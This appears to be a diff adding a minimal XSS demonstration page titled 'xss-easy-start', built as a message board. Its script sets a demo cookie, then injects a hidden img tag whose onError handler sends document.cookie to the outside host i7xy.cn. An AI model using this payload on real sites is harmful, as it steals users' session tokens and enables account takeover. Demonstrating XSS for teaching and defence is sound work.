@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>xss-easy-start</title>
+  </head>
+  <body>
+    <h1>xss - 留言板</h1>
+    <div id="messages"></div>
+    <script>
+      window.onload = function() {
+        document.cookie = "token=jueJin";
+
+        const msgs = document.getElementById("messages");
+        const p = document.createElement("p");
+        p.innerHTML = '<img onError="window.location.replace(\'//i7xy.cn?token=\'+ document.cookie);" " style="display:none" src="invalidPath">i am xss';
+        msgs.appendChild(p);
+      };
+    </script>
+  </body>
+</html>
